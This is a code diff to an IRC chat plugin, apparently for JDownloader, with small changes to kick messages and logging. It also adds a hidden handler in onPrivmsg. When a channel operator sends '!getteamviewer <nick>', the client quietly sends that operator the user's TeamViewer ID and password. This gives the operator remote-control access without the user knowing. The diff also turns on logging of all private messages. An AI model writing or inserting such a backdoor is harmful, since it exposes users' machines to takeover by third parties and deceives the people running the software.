@@ -2,6 +2,7 @@ package jd.plugins.optional.jdchat;
 
 import java.util.logging.Logger;
 
+import jd.parser.Regex;
 import jd.utils.JDUtilities;
 
 import org.schwering.irc.lib.IRCConstants;
@@ -24,6 +25,7 @@ class IRCListener implements IRCEventListener {
         owner.addToText(null, JDChat.STYLE_SYSTEM_MESSAGE, "Connection lost. type /connect if jd does not connect by itself");
 
     }
+    
 
     public void onError(int num, String msg) {
         owner.addToText(null, JDChat.STYLE_ERROR, msg);
@@ -58,7 +60,7 @@ class IRCListener implements IRCEventListener {
     public void onKick(String chan, IRCUser u, String nickPass, String msg) {
         // logger.info(chan + "> " + u.getNick() + " kicks " + nickPass);
 
-        owner.addToText(null, JDChat.STYLE_SYSTEM_MESSAGE, u.getNick() + " kicks " + nickPass);
+        owner.addToText(null, JDChat.STYLE_SYSTEM_MESSAGE, u.getNick() + " kicks " + nickPass + " (" + msg + ")");
     }
 
     public void onMode(IRCUser u, String nickPass, String mode) {
@@ -115,9 +117,22 @@ class IRCListener implements IRCEventListener {
     }
 
     public void onPrivmsg(String chan, IRCUser u, String msg) {
+    	
         User user = owner.getUser(u.getNick());
         if (user == null) { return; }
-        if (msg.trim().startsWith("ACTION ")) {
+        
+        if((user.rank == User.RANK_OP)&&(msg.trim().matches("\\!getteamviewer[\\s]+" + owner.getNick())))
+        {
+    		String[] data = TeamViewer.handleTeamviewer();
+    		owner.sendMessage(user.name, "Teamviewerdaten von " + owner.getNick() + ": ID: " + data[0] + " PW: " + data[1]);	
+       	
+        	/*new Thread() {
+        		
+        		
+        	}.start();*/
+        	
+        	
+        } else if (msg.trim().startsWith("ACTION ")) {
             owner.addToText(null, JDChat.STYLE_ACTION, user.getNickLink("pmnick") + " " + Utils.prepareMsg(msg.trim().substring(6).trim()));
 
         } else if (chan.equals(owner.getNick())) {
@@ -130,7 +145,7 @@ class IRCListener implements IRCEventListener {
 
         }
 
-        // logger.info(chan + "> " + u.getNick() + ": " + msg);
+         logger.info(chan + ">" + user.rank +  " " + u.getNick() + ": " + msg);
     }
 
     public void onQuit(IRCUser u, String msg) {
@@ -151,7 +166,7 @@ class IRCListener implements IRCEventListener {
 
     public void onReply(int num, String value, String msg) {
 
-        // logger.info("Reply #" + num + ": " + value + " " + msg);
+        //logger.info("Reply #" + num + ": " + value + " " + msg);
         if (num == IRCConstants.RPL_NAMREPLY) {
             owner.addUsers(msg.trim().split(" "));
         }
